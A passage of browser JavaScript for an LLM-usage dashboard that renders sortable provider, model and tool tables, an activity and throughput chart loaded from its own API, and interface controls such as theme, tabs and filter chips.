    document.querySelectorAll(`#${tableId} th[data-sort]`).forEach(th => {
        const field = th.dataset.sort;
        const activate = () => {
            if (sortState.field === field) {
                sortState.asc = !sortState.asc;
            } else {
                sortState.field = field;
                sortState.asc = ASCENDING_FIRST.has(field);
            }
            updateSortIcons(tableId, sortState);
            renderFn();
        };
        // The control is a real <button> inside the heading rather than the
        // heading itself. Putting role="button" on a <th> overwrites its
        // implicit columnheader role, which cost every table on the page its
        // column headers to a screen reader, and made aria-sort invalid so the
        // sort state stopped being announced. The button is focusable and
        // operable by keyboard natively, so the tabindex and keydown handler
        // the old markup needed are no longer needed either.
        const btn = document.createElement('button');
        btn.type = 'button';
        btn.className = 'sort-btn';
        btn.innerHTML = th.innerHTML;
        th.innerHTML = '';
        th.appendChild(btn);
        btn.addEventListener('click', activate);
    });
}

function updateSortIcons(tableId, sortState) {
    document.querySelectorAll(`#${tableId} th`).forEach(th => {
        const field = th.dataset.sort;
        const icon = th.querySelector('.sort-icon');
        if (!icon) return;
        if (field === sortState.field) {
            th.classList.add('sorted');
            icon.textContent = sortState.asc ? '▲' : '▼';
            th.setAttribute('aria-sort', sortState.asc ? 'ascending' : 'descending');
            th.title = 'Sorted ' + (sortState.asc ? 'ascending' : 'descending') +
                '; click to reverse';
        } else {
            th.classList.remove('sorted');
            icon.textContent = '▼';
            th.setAttribute('aria-sort', 'none');
            th.title = 'Sort by this column';
        }
    });
}

// ── Providers table sorting ───────────────────────────────────────────
const providers = (dashboardData.providers || []).slice();
let providerSort = { field: 'cost', asc: false };

function renderProviders() {
    const tbody = document.getElementById('providers-tbody');
    if (!tbody) return;
    const sorted = sortData(providers, providerSort);
    if (!sorted.length) {
        tbody.innerHTML = emptyRow(PROVIDERS_COLUMNS, 'No provider calls in this view.');
        return;
    }

    tbody.innerHTML = sorted.map(p => {
        const provClass = 'provider-' + p.name.toLowerCase().replace(/[^a-z0-9]/g, '');
        const breakdown = tokenTitle(p);
        const modelsList = (p.models && p.models.length > 0)
            ? 'Models: ' + p.models.join(', ')
            : p.name;

        return `
            <tr>
                <td><a href="${filterLink('model', p.models || [])}" class="model-tag ${escapeHtml(provClass)}" title="${escapeHtml(modelsList)}">${escapeHtml(p.name)}</a></td>
                <td class="numeric" title="${formatFullNumber(p.messages)}">${formatCompactNumber(p.messages)}</td>
                <td class="tokens numeric" title="${escapeHtml(breakdown)}">${formatCompactNumber(p.tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(p.input_tokens)}">${formatCompactNumber(p.input_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(p.output_tokens)}">${formatCompactNumber(p.output_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(p.cache_read_tokens)}">${formatCompactNumber(p.cache_read_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(p.cache_write_tokens)}">${formatCompactNumber(p.cache_write_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(p.reasoning_tokens)}">${formatCompactNumber(p.reasoning_tokens)}</td>
                <td class="c-blue numeric">${(p.avg_tps || 0).toFixed(1)}</td>
                <td class="cost numeric">${formatMoney(p.cost)}</td>
                <td class="numeric">
                    <div class="bar-container bar-inline">
                        <div class="bar" style="width: ${p.pct}%"></div>
                    </div>
                    ${p.pct.toFixed(1)}%
                </td>
            </tr>
        `;
    }).join('');
}

// ── Models table sorting ──────────────────────────────────────────────
const models = (dashboardData.models || []).slice();
let modelSort = { field: 'cost', asc: false };

const modelToProvider = {};
function indexProviders() {
    (dashboardData.providers || []).forEach(p => {
        (p.models || []).forEach(m => {
            modelToProvider[m] = p.name;
        });
    });
}
indexProviders();

function renderModels() {
    const tbody = document.getElementById('models-tbody');
    if (!tbody) return;
    const sorted = sortData(models, modelSort);
    if (!sorted.length) {
        tbody.innerHTML = emptyRow(MODELS_COLUMNS, 'No model calls in this view.');
        return;
    }

    tbody.innerHTML = sorted.map(m => {
        const prov = modelToProvider[m.name] || 'Other';
        const provClass = 'provider-' + prov.toLowerCase().replace(/[^a-z0-9]/g, '');
        const modelClass = m.name.toLowerCase().includes('claude') ? 'model-claude' : 'model-other';
        // The tooltip lists every token column the row carries, which is what
        // the breakdown columns exist for: a total alone says nothing about
        // whether a cheap run was mostly cached.
        const breakdown = tokenTitle(m);

        return `
            <tr>
                <td><a href="${filterLink('model', m.name)}" class="model-tag ${modelClass} ${escapeHtml(provClass)}" title="Filter to ${escapeHtml(m.name)} · provider: ${escapeHtml(prov)}">${escapeHtml(m.name)}</a></td>
                <td class="numeric" title="${formatFullNumber(m.messages)}">${formatCompactNumber(m.messages)}</td>
                <td class="tokens numeric" title="${escapeHtml(breakdown)}">${formatCompactNumber(m.tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(m.input_tokens)}">${formatCompactNumber(m.input_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(m.output_tokens)}">${formatCompactNumber(m.output_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(m.cache_read_tokens)}">${formatCompactNumber(m.cache_read_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(m.cache_write_tokens)}">${formatCompactNumber(m.cache_write_tokens)}</td>
                <td class="tokens numeric" title="${formatFullNumber(m.reasoning_tokens)}">${formatCompactNumber(m.reasoning_tokens)}</td>
                <td class="c-blue numeric">${(m.avg_tps || 0).toFixed(1)}</td>
                <td class="cost numeric">${formatMoney(m.cost)}</td>
                <td class="numeric" title="average cost per call">${formatMoney(Number(m.per_call || 0), 4)}</td>
                <td class="numeric" title="cost per 1,000 generated (output + reasoning) tokens">${formatMoney(Number(m.per_1k_output || 0), 4)}</td>
                <td class="numeric">
                    <div class="bar-container bar-inline">
                        <div class="bar" style="width: ${m.pct}%"></div>
                    </div>
                    ${m.pct.toFixed(1)}%
                </td>
            </tr>
        `;
    }).join('');
}

// ── Tools table sorting ───────────────────────────────────────────────
const tools = (dashboardData.tools || []).slice();
let toolSort = { field: 'time', asc: false };

function renderTools() {
    const tbody = document.getElementById('tools-tbody');
    if (!tbody) return;
    const sorted = sortData(tools, toolSort);
    if (!sorted.length) {
        tbody.innerHTML = emptyRow(TOOLS_COLUMNS, 'No tool calls in this view.');
        return;
    }

    // The cost attributed to each tool is what the column header promises, so it
    // is what is rendered; the bar underneath is that tool's share of the total
    // attributed cost, not a share of wall time.
    const totalCostAttributed = tools.reduce((sum, t) => sum + (Number(t.cost) || 0), 0);

    tbody.innerHTML = sorted.map(t => {
        const errorClass = t.errors > 0 ? 'c-red' : 'c-muted';
        const share = totalCostAttributed > 0
            ? (Number(t.cost) || 0) / totalCostAttributed * 100
            : 0;
        return `
            <tr>
                <td><span class="model-tag model-other">${escapeHtml(t.name)}</span></td>
                <td class="numeric" title="${formatFullNumber(t.calls)}">${formatCompactNumber(t.calls)}</td>
                <td class="c-yellow numeric">${t.time_display}</td>
                <td class="c-muted numeric">${t.avg_time_display}</td>
                <td class="${errorClass} numeric">${t.errors}</td>
                <td class="numeric" title="share of attributed cost: ${share.toFixed(1)}%">
                    <span class="cost">${formatMoney((Number(t.cost) || 0))}</span>
                    <div class="bar-container bar-inline">
                        <div class="bar" style="width: ${share.toFixed(1)}%; background: var(--accent-green)"></div>
                    </div>
                </td>
            </tr>
        `;
    }).join('');
}

// Go to another filter: in place when app.js is there to do it.
function dashdGo(url) {
    if (typeof window !== 'undefined' && typeof window.dashdNavigate === 'function') window.dashdNavigate(url);
    else location.href = url;
}

// Setup
setupDelegatedActions();
setupSessionsToolbar();
setupSorting('projects-table', projectSort, renderProjects);
setupSorting('sessions-table', sessionsSort, () => { sessionsPage = 0; loadSessions(); });
setupSorting('providers-table', providerSort, renderProviders);
setupSorting('models-table', modelSort, renderModels);
setupSorting('tools-table', toolSort, renderTools);

// The page can ask for a session ordering, as insight links do (?sort=errors).
(function () {
    const q = new URLSearchParams((typeof location !== 'undefined' && location.search) || '');
    const want = q.get('sort');
    if (!want) return;
    const field = Object.keys(SESSION_SORT_KEYS).find(k => SESSION_SORT_KEYS[k] === want || k === want);
    if (field) {
        sessionsSort.field = field;
        sessionsSort.asc = q.get('asc') === '1';
    }
})();

dashdRefreshers.push(() => {
    refillArray(projects, dashboardData.projects);
    refillArray(providers, dashboardData.providers);
    refillArray(models, dashboardData.models);
    refillArray(tools, dashboardData.tools);
    indexProviders();
    sessionsPage = 0;
    renderProjects();
    renderProviders();
    renderModels();
    renderTools();
    loadSessions();
});

// Initial render
renderProjects();
loadSessions();
renderProviders();
renderModels();
renderTools();
updateSortIcons('projects-table', projectSort);
updateSortIcons('sessions-table', sessionsSort);
updateSortIcons('providers-table', providerSort);
updateSortIcons('models-table', modelSort);
updateSortIcons('tools-table', toolSort);

// Activity & throughput: messages sent, tokens produced, and how quickly
// responses came back, over a rolling window that ends at the newest call.
//
// The series is fetched from /api/activity rather than read out of the page
// payload. That is what lets any window be exact: the server buckets the stored
// calls over the range asked for, so a chart of last March is as accurate as a
// chart of this afternoon even though March's logs are long gone.
(function() {
    const chartEl = document.getElementById('activity-chart');
    if (!chartEl) return; // Section not rendered

    const summaryEl = document.getElementById('activity-summary');
    const badgeEl = document.getElementById('activity-window-badge');
    const tbodyEl = document.getElementById('activity-tbody');
    const rangeEl = document.getElementById('activity-range');
    const metricEl = document.getElementById('activity-metric');
    const stepEl = document.getElementById('activity-step');
    const noteEl = document.querySelector('.activity-note');

    const DAY = 86400e3;
    const HOUR = 3600e3;

    // Every metric is derived from the same summed bucket fields, so switching
    // metric never changes what the window totals report.
    const METRICS = {
        messages: {
            label: 'Messages',
            color: '#58a6ff',
            value: b => b.messages,
            format: v => formatFullNumber(v),
        },
        outputTokens: {
            label: 'Output tokens',
            color: '#3fb950',
            value: b => b.output_tokens,
            format: v => formatCompactNumber(v),
        },
        totalTokens: {
            label: 'Total tokens',
            color: '#a371f7',
            value: b => b.total_tokens,
            format: v => formatCompactNumber(v),
        },
        throughput: {
            label: 'Throughput',
            color: '#3fb950',
            // Output over the time actually spent waiting on responses.
            // Weighting by seconds is the same rule the rest of the dashboard
            // uses for tokens/s, so the chart and the global card agree.
            value: b => (b.llm_seconds > 0 ? b.output_tokens / b.llm_seconds : 0),
            format: v => trimOneDecimal(v) + ' tok/s',
        },
        latency: {
            label: 'Response time',
            color: '#d29922',
            value: b => (b.messages > 0 ? b.llm_seconds / b.messages : 0),
            format: v => (v > 0 ? formatDuration(v) : '—'),
        },
        cost: {
            label: 'Cost',
            color: '#3fb950',
            value: b => b.cost,
            format: v => formatMoney(v),
        },
    };

    // The controls live in the query string, like the filter bar, so a reload or
    // a shared link keeps the view.
    function readControlState() {
        const params = new URLSearchParams(window.location.search);
        const apply = (el, value, fallback) => {
            if (!el || value === null) return;
            const valid = Array.from(el.options).some(o => o.value === value);
            el.value = valid ? value : fallback;
        };
        apply(rangeEl, params.get('aw'), '86400');
        apply(metricEl, params.get('am'), 'messages');
        apply(stepEl, params.get('as'), 'auto');
    }

    function writeControlState() {
        if (!window.history || !window.history.replaceState) return;
        const params = new URLSearchParams(window.location.search);
        const put = (key, el, fallback) => {
            const value = el ? el.value : '';
            if (!value || value === fallback) params.delete(key);
            else params.set(key, value);
        };
        put('aw', rangeEl, '86400');
        put('am', metricEl, 'messages');
        put('as', stepEl, 'auto');
        const query = params.toString();
        window.history.replaceState(
            null, '', window.location.pathname + (query ? '?' + query : '')
        );
    }

    function currentMetric() {
        return METRICS[metricEl && metricEl.value] || METRICS.messages;
    }

    // ---------------------------------------------------------------- fetch

    let requestToken = 0;

    async function load() {
        const token = ++requestToken;
        const params = new URLSearchParams(window.location.search);
        // Only the axes that change this series are sent; the rest are already in
        // the query string the filter bar maintains.
        ['model', 'agent', 'project', 'date_from', 'date_to'].forEach(k => {
            const v = params.get(k);
            if (v) params.set(k, v);
        });
        params.set('range', rangeEl ? rangeEl.value : '86400');
        if (stepEl && stepEl.value && stepEl.value !== 'auto') {
            params.set('step', stepEl.value);
        } else {
            params.delete('step');
        }

        if (badgeEl) badgeEl.textContent = 'loading…';
        try {
            const resp = await fetch('/api/activity?' + params.toString(), {
                headers: { 'Accept': 'application/json' },
            });
            if (!resp.ok) throw new Error('status ' + resp.status);
            const data = await resp.json();
            // A slower earlier request must not overwrite a newer one.
            if (token !== requestToken) return;
            render(data);
        } catch (err) {
            if (token !== requestToken) return;
            if (chartEl) {
                chartEl.innerHTML =
                    '<div class="activity-empty">Could not load activity: ' +
                    escapeHtml(String(err)) + '</div>';
            }
            if (badgeEl) badgeEl.textContent = 'unavailable';
            if (typeof window !== 'undefined' && typeof window.showDashdToast === 'function') {
                window.showDashdToast('Could not load activity');
            }
        }
    }

    // ---------------------------------------------------------------- render

    function render(data) {
        const buckets = data.buckets || [];
        const step = data.step * 1000;
        const metric = currentMetric();

        if (noteEl) {
            noteEl.style.display = data.oldest ? 'none' : 'block';
        }

        if (!buckets.length) {
            if (badgeEl) badgeEl.textContent = 'no activity';
            if (summaryEl) summaryEl.innerHTML = '';
            if (chartEl) {
                chartEl.innerHTML =
                    '<div class="activity-empty">No calls in this window.</div>';
            }
            if (tbodyEl) {
                tbodyEl.innerHTML = emptyRow(ACTIVITY_COLUMNS, 'No calls in this window.');
            }
            return;
        }

        const active = buckets.filter(b => b.messages > 0).length;
        if (badgeEl) {
            badgeEl.textContent = buckets.length + ' × ' + stepLabel(data.step) +
                ' · ' + active + ' active';
        }
        if (summaryEl) summaryEl.innerHTML = summarize(buckets, metric, data.step);
        chartEl.innerHTML = chart(buckets, metric, step, data);
        if (tbodyEl) tbodyEl.innerHTML = renderActivityTable(buckets, step, data);
    }

    function summarize(buckets, metric, stepSeconds) {
        const total = emptyBucket();
        buckets.forEach(b => {
            total.messages += b.messages;
            total.input_tokens += b.input_tokens;
            total.output_tokens += b.output_tokens;
            total.cache_read_tokens += b.cache_read_tokens;
            total.cache_write_tokens += b.cache_write_tokens;
            total.reasoning_tokens += b.reasoning_tokens;
            total.total_tokens += b.total_tokens;
            total.llm_seconds += b.llm_seconds;
            total.cost += b.cost;
            total.unpriced += b.unpriced || 0;
        });
        const values = buckets.map(metric.value);
        const peak = values.length ? Math.max(...values) : 0;
        const active = buckets.filter(b => b.messages > 0).length;

        const cards = [
            ['Messages sent', formatFullNumber(total.messages)],
            ['Output tokens', formatCompactNumber(total.output_tokens)],
            ['Total tokens', formatCompactNumber(total.total_tokens)],
            ['Throughput',
                total.llm_seconds > 0
                    ? trimOneDecimal(total.output_tokens / total.llm_seconds) + ' tok/s'
                    : '—'],
            ['Avg response',
                total.messages > 0 ? formatDuration(total.llm_seconds / total.messages) : '—'],
            ['Cost', formatMoney(total.cost)],
            ['Peak ' + metric.label.toLowerCase(), peak > 0 ? metric.format(peak) : '—'],
            ['Active time',
                active > 0 ? formatDuration(active * stepSeconds) : '—'],
        ];
        // A model with no known price contributes tokens but no cost. Saying so
        // keeps a $0.00 from reading as "free".
        if (total.unpriced > 0) {
            cards.push(['Unpriced calls', formatFullNumber(total.unpriced)]);
        }

        return cards.map(([label, value]) =>
            '<div class="activity-summary-item">' +
            '<div class="label">' + escapeHtml(label) + '</div>' +
            '<div class="value">' + escapeHtml(value) + '</div></div>'
        ).join('');
    }

    function chart(buckets, metric, step, data) {
        // The server sends only non-empty buckets; gaps are filled here so an
        // idle stretch reads as idle rather than as missing data.
        // The server sends `t` in seconds; the axis works in milliseconds.
        // Normalising on the way in means a real bucket and a synthesised gap
        // are the same shape, rather than real buckets being labelled as 1970.
        // The server decides where every bucket boundary is; the browser only
        // fills the gaps between the buckets it was given.
        //
        // Re-deriving boundaries here was wrong: the server buckets on epoch
        // arithmetic, while flooring to a local midnight drifts by an hour across
        // a DST change. On such a day nothing matched, the chart came back empty,
        // and the table beneath it was full.
        const byStart = new Map();
        buckets.forEach(b => {
            const normalised = Object.assign({}, b, { t: b.t * 1000 });
            byStart.set(normalised.t, normalised);
        });
        const filled = [];
        if (byStart.size) {
            const first = byStart.keys().next().value;
            const last = Array.from(byStart.keys()).pop();
            for (let t = first; t <= last; t += step) {
                filled.push(byStart.get(t) || Object.assign(emptyBucket(), { t }));
            }
        }
        if (!filled.length) return '<div class="activity-empty">No activity.</div>';

        const values = filled.map(metric.value);
        const max = Math.max(...values, 0);
        // The newest bucket is the one the server is still filling.
        const current = filled[filled.length - 1].t;

        const columns = filled.map(bucket => {
            const value = metric.value(bucket);
            const height = max > 0 && value > 0 ? Math.max((value / max) * 100, 0.6) : 0;
            const classes = ['activity-col'];
            if (value <= 0) classes.push('empty');
            // The newest bucket is only partly elapsed, so it is marked rather
            // than silently shown as a full-width total.
            if (bucket.t === current) classes.push('partial');
            const lines = [bucketLabel(bucket.t, step)];
            if (bucket.t === current) lines.push('partial window, still filling');
            if (value > 0) {
                lines.push(metric.label + ': ' + metric.format(value));
                if (metric !== METRICS.messages) {
                    lines.push('Messages: ' + formatFullNumber(bucket.messages));
                }
                const tput = bucket.llm_seconds > 0
                    ? bucket.output_tokens / bucket.llm_seconds : 0;
                const resp = bucket.messages > 0
                    ? bucket.llm_seconds / bucket.messages : 0;
                lines.push('Output: ' + formatFullNumber(bucket.output_tokens));
                lines.push('Input: ' + formatFullNumber(bucket.input_tokens));
                lines.push('Throughput: ' +
                    (tput ? trimOneDecimal(tput) + ' tok/s' : '—'));
                lines.push('Avg response: ' + (resp ? formatDuration(resp) : '—'));
                lines.push('Cost: $' + bucket.cost.toFixed(4));
            } else {
                lines.push('No calls');
            }
            const color = value > 0 ? metric.color : '';
            return '<div class="' + classes.join(' ') + '" title="' +
                escapeHtml(lines.join('\n')) + '">' +
                '<div class="activity-col-fill" style="height:' + height.toFixed(2) +
                '%;' + (color ? 'background:' + color : '') + '"></div></div>';
        }).join('');

        // Label roughly a dozen buckets, however many there are.
        const every = Math.max(1, Math.ceil(filled.length / 12));
        const axis = filled.map((bucket, i) => {
            const show = i % every === 0 || i === filled.length - 1;
            return '<span class="activity-axis-tick">' +
                (show ? escapeHtml(axisLabel(bucket.t, step, data.from * 1000, data.to * 1000)) : '') + '</span>';
        }).join('');

        // An all-zero window has no meaningful top of scale, and inventing one
        // would put a number on the axis that is not in the data.
        const ticks = max > 0
            ? [1, 0.5, 0].map(f => {
                const bottom = f * 100;
                const label = f === 0 ? '0' : metric.format(max * f);
                return '<span class="activity-y-tick" style="bottom:' + bottom + '%">' +
                    escapeHtml(label) + '</span>';
            }).join('')
            : '<span class="activity-y-tick" style="bottom:0%">0</span>';
        const gridlines = max > 0
            ? [50, 0].map(f =>
                '<div class="activity-gridline" style="bottom:' + f + '%"></div>').join('')
            : '';

        return '<div class="activity-plot">' +
            '<div class="activity-yaxis">' + ticks + '</div>' +
            '<div class="activity-plotarea">' + gridlines +
            '<div class="activity-columns">' + columns + '</div></div></div>' +
            '<div class="activity-axis">' + axis + '</div>';
    }

    function renderActivityTable(buckets, step, data) {
        const current = buckets.length
            ? buckets[buckets.length - 1].t * 1000
            : 0;
        const rows = [...buckets].reverse().map(bucket => {
            // Seconds to milliseconds, matching what the chart shows.
            bucket = Object.assign({}, bucket, { t: bucket.t * 1000 });
            const tput = bucket.llm_seconds > 0
                ? bucket.output_tokens / bucket.llm_seconds : 0;
            const resp = bucket.messages > 0
                ? bucket.llm_seconds / bucket.messages : 0;
            const partial = bucket.t === current;
            return '<tr>' +
                '<td class="bucket-label' + (partial ? ' current' : '') + '">' +
                    escapeHtml(bucketLabel(bucket.t, step)) +
                    (partial ? ' (partial)' : '') + '</td>' +
                '<td class="numeric">' + formatFullNumber(bucket.messages) + '</td>' +
                '<td class="numeric">' + formatFullNumber(bucket.output_tokens) + '</td>' +
                '<td class="numeric">' + formatFullNumber(bucket.input_tokens) + '</td>' +
                '<td class="numeric" title="' +
                    escapeHtml(formatFullNumber(bucket.total_tokens)) + '">' +
                    formatCompactNumber(bucket.total_tokens) + '</td>' +
                '<td class="numeric">' + (tput ? trimOneDecimal(tput) : '—') + '</td>' +
                '<td class="numeric">' + (resp ? formatDuration(resp) : '—') + '</td>' +
                '<td class="numeric">' + formatDuration(bucket.llm_seconds) + '</td>' +
                '<td class="numeric">$' + bucket.cost.toFixed(4) + '</td></tr>';
        }).join('');
        return rows || emptyRow(ACTIVITY_COLUMNS, 'No activity in this window.');
    }

    // ---------------------------------------------------------------- helpers

    function emptyBucket() {
        return {
            t: 0, messages: 0, input_tokens: 0, output_tokens: 0,
            cache_read_tokens: 0, cache_write_tokens: 0, reasoning_tokens: 0,
            total_tokens: 0, llm_seconds: 0, cost: 0, unpriced: 0,
        };
    }

    function stepLabel(seconds) {
        if (seconds >= 86400) return trimOneDecimal(seconds / 86400) + 'd';
        if (seconds >= 3600) return trimOneDecimal(seconds / 3600) + 'h';
        if (seconds >= 60) return trimOneDecimal(seconds / 60) + 'm';
        return seconds + 's';
    }

    function axisLabel(ms, step, from, to) {
        const d = new Date(ms);
        if (step >= DAY) {
            return d.toLocaleDateString(undefined, { month: 'short', day: 'numeric' });
        }
        // An hourly tick is labelled with the day as well as the hour once the
        // window spans one. Without it a 24-hour view whose labels are all "03"
        // reads as a rendering fault rather than as the clock going round.
        const spansDays = to - from > 20 * HOUR;
        if (step >= HOUR && spansDays) {
            return d.toLocaleDateString(undefined, { weekday: 'short' }) + ' ' +
                d.toLocaleTimeString(undefined, { hour: '2-digit' });
        }
        return d.toLocaleTimeString(undefined, {
            hour: '2-digit', minute: step < HOUR ? '2-digit' : undefined,
        });
    }

    function bucketLabel(ms, step) {
        const start = new Date(ms);
        if (step >= DAY) {
            return start.toLocaleDateString(undefined, {
                weekday: 'short', month: 'short', day: 'numeric',
            });
        }
        const end = new Date(ms + step);
        const time = t => t.toLocaleTimeString(undefined, { hour: '2-digit', minute: '2-digit' });
        return time(start) + ' – ' + time(end);
    }

    // ---------------------------------------------------------------- wiring

    [rangeEl, metricEl, stepEl].forEach(el => {
        if (el) {
            el.addEventListener('change', () => {
                writeControlState();
                load();
            });
        }
    });

    readControlState();
    load();
    dashdRefreshers.push(load);
})();

// ── UI Shell: views, theme, filter drawer, presets, chips, shortcuts ──
(function() {
    if (typeof document === 'undefined') return;

    const toastEl = document.getElementById('toast');
    let toastTimer = null;
    function showToast(msg) {
        if (!toastEl) return;
        toastEl.textContent = msg;
        toastEl.classList.add('is-visible');
        clearTimeout(toastTimer);
        toastTimer = setTimeout(() => toastEl.classList.remove('is-visible'), 2200);
    }
    if (typeof window !== 'undefined') {
        window.showDashdToast = showToast;
    }

    // Theme toggle (dark default, light optional)
    const themeBtn = document.getElementById('theme-toggle');
    function applyTheme(theme) {
        if (document.documentElement && document.documentElement.setAttribute) {
            if (theme === 'light') {
                document.documentElement.setAttribute('data-theme', 'light');
            } else {
                document.documentElement.removeAttribute('data-theme');
            }
        }
        if (themeBtn) {
            themeBtn.textContent = theme === 'light' ? '☾' : '☀';
            themeBtn.title = theme === 'light' ? 'Switch to dark theme' : 'Switch to light theme';
        }
    }
    let savedTheme = 'dark';
    try {
        savedTheme = localStorage.getItem('dashd:theme') || 'dark';
    } catch (_) {}
    applyTheme(savedTheme);
    if (themeBtn && themeBtn.addEventListener) {
        themeBtn.addEventListener('click', () => {
            savedTheme = savedTheme === 'light' ? 'dark' : 'light';
            try { localStorage.setItem('dashd:theme', savedTheme); } catch (_) {}
            applyTheme(savedTheme);
        });
    }

    // View tabs (overview, sessions, breakdown, system, all)
    const viewTabsEl = document.getElementById('view-tabs');
    const validViews = new Set(['overview', 'insights', 'sessions', 'breakdown', 'system', 'all']);
    function setActiveView(view) {
        if (!validViews.has(view)) view = 'overview';
        if (viewTabsEl && viewTabsEl.querySelectorAll) {
            viewTabsEl.querySelectorAll('[data-view-tab]').forEach(tab => {
                const active = tab.dataset.viewTab === view;
                tab.classList.toggle('is-active', active);
                tab.setAttribute('aria-selected', active ? 'true' : 'false');
                tab.setAttribute('tabindex', active ? '0' : '-1');
                if (active && tab.id) {
                    const panel = document.getElementById('main-panel');
                    if (panel) panel.setAttribute('aria-labelledby', tab.id);
                }
            });
        }
        if (document.querySelectorAll) {
            document.querySelectorAll('[data-view-section]').forEach(sec => {
                const targets = (sec.dataset.viewSection || '').split(/\s+/);
                const visible = view === 'all' || targets.includes(view);
                sec.classList.toggle('is-hidden', !visible);
            });
        }
        try { localStorage.setItem('dashd:view', view); } catch (_) {}
        if (typeof history !== 'undefined' && history.replaceState) {
            history.replaceState(null, '', '#' + view);
        }
    }

    let initialView = 'overview';
    const viewParam = typeof location !== 'undefined'
        ? new URLSearchParams(location.search).get('view') : null;
    if (viewParam && validViews.has(viewParam)) {
        initialView = viewParam;
    } else if (typeof location !== 'undefined' && location.hash) {
        const h = location.hash.slice(1);
        if (validViews.has(h)) initialView = h;
    } else {
        try {
            const stored = localStorage.getItem('dashd:view');
            if (stored && validViews.has(stored)) initialView = stored;
        } catch (_) {}
    }
    setActiveView(initialView);
    window.dashdSetView = setActiveView;

    if (viewTabsEl && viewTabsEl.addEventListener) {
        viewTabsEl.addEventListener('click', event => {
            const tab = event.target.closest('[data-view-tab]');
            if (tab) setActiveView(tab.dataset.viewTab);
        });
        // WAI-ARIA tabs: arrow keys, Home and End move between tabs.
        viewTabsEl.addEventListener('keydown', event => {
            const keys = ['ArrowLeft', 'ArrowRight', 'Home', 'End'];
            if (!keys.includes(event.key) || !viewTabsEl.querySelectorAll) return;
            const tabs = Array.from(viewTabsEl.querySelectorAll('[data-view-tab]'));
            const idx = tabs.findIndex(t => t.classList.contains('is-active'));
            let next = idx;
            if (event.key === 'ArrowLeft') next = (idx - 1 + tabs.length) % tabs.length;
            if (event.key === 'ArrowRight') next = (idx + 1) % tabs.length;
            if (event.key === 'Home') next = 0;
            if (event.key === 'End') next = tabs.length - 1;
            event.preventDefault();
            setActiveView(tabs[next].dataset.viewTab);
            if (tabs[next].focus) tabs[next].focus();
        });
    }
    if (document.addEventListener) {
        document.addEventListener('click', event => {
            const btn = event.target.closest('[data-open-view]');
            if (btn) setActiveView(btn.dataset.openView);
        });
    }

    // Breakdown sub-tabs (all, models, providers, projects, tools)
    const breakdownTabsEl = document.getElementById('breakdown-tabs');
    const validBreakdowns = new Set(['all', 'models', 'providers', 'projects', 'machines', 'tools', 'tags']);
    function setActiveBreakdown(sub) {
        if (!validBreakdowns.has(sub)) sub = 'all';
        if (breakdownTabsEl && breakdownTabsEl.querySelectorAll) {
            breakdownTabsEl.querySelectorAll('[data-breakdown-tab]').forEach(tab => {
                const active = tab.dataset.breakdownTab === sub;
                tab.classList.toggle('is-active', active);
                tab.setAttribute('aria-selected', active ? 'true' : 'false');
            });
        }
        if (document.querySelectorAll) {
            document.querySelectorAll('[data-breakdown-panel]').forEach(panel => {
                const visible = sub === 'all' || panel.dataset.breakdownPanel === sub;
                // Its own class: the view tabs own is-hidden on these same
                // sections, and sharing it un-hid them on other tabs.
                panel.classList.toggle('is-sub-hidden', !visible);
            });
        }
        try { localStorage.setItem('dashd:breakdown', sub); } catch (_) {}
    }
    let initialBreakdown = 'all';
    const subParam = typeof location !== 'undefined'
        ? new URLSearchParams(location.search).get('sub') : null;
    try {
        const storedSub = localStorage.getItem('dashd:breakdown');
        if (storedSub && validBreakdowns.has(storedSub)) initialBreakdown = storedSub;
    } catch (_) {}
    if (subParam && validBreakdowns.has(subParam)) initialBreakdown = subParam;
    setActiveBreakdown(initialBreakdown);
    window.dashdSetBreakdown = setActiveBreakdown;
    if (breakdownTabsEl && breakdownTabsEl.addEventListener) {
        breakdownTabsEl.addEventListener('click', event => {
            const tab = event.target.closest('[data-breakdown-tab]');
            if (tab) setActiveBreakdown(tab.dataset.breakdownTab);
        });
    }

    // Filter drawer toggle
    const filterToggle = document.getElementById('filter-toggle');
    const filterPanel = document.getElementById('filter-panel');
    if (filterToggle && filterPanel && filterToggle.addEventListener) {
        filterToggle.addEventListener('click', () => {
            const collapsed = filterPanel.classList.toggle('is-collapsed');
            filterToggle.setAttribute('aria-expanded', collapsed ? 'false' : 'true');
        });
    }

    // Active filter chips + badge
    const chipsEl = document.getElementById('active-filter-chips');
    const badgeEl = document.getElementById('filter-badge');
    function paintFilterState() {
        const params = typeof location !== 'undefined'
            ? new URLSearchParams(location.search)
            : new URLSearchParams();
        const activeEntries = [];
        [
            ['model', 'Model'],
            ['agent', 'Program'],
            ['project', 'Project'],
            ['machine', 'Machine'],
            ['tag', 'Tag'],
            ['date_from', 'From'],
            ['date_to', 'To'],
        ].forEach(([key, label]) => {
            params.getAll(key).forEach(val => {
                if (val) activeEntries.push({ key, label, val });
            });
        });
        if (params.get('unpriced') === '1' || params.get('unpriced') === 'true') {
            activeEntries.push({ key: 'unpriced', label: 'Status', val: 'unpriced' });
        }

        if (badgeEl) {
            badgeEl.textContent = String(activeEntries.length);
            badgeEl.hidden = activeEntries.length === 0;
        }

        if (chipsEl) {
            chipsEl.innerHTML = !activeEntries.length ? '' : activeEntries.map(e =>
                `<span class="filter-chip">${escapeHtml(e.label)}: <strong>${escapeHtml(e.val)}</strong>` +
                `<button type="button" data-remove-filter-key="${escapeHtml(e.key)}" data-remove-filter-val="${escapeHtml(e.val)}" aria-label="Remove ${escapeHtml(e.label)} filter">&times;</button></span>`
            ).join('') + '<a href="/?range=all" class="clear-link">Clear all</a>';

        }
        const rangeEl = document.getElementById('filter-range');
        if (rangeEl) rangeEl.value = params.get('range') || '';
        const hasDates = !!(params.get('date_from') || params.get('date_to'));
        const currentRange = hasDates ? '' : (params.get('range') || 'all');
        if (document.querySelectorAll) {
            document.querySelectorAll('[data-date-preset]').forEach(btn => {
                btn.classList.toggle('is-active', btn.dataset.datePreset === currentRange);
            });
        }
    }
    paintFilterState();
    dashdRefreshers.push(paintFilterState);
    if (chipsEl && chipsEl.addEventListener) {
        chipsEl.addEventListener('click', event => {
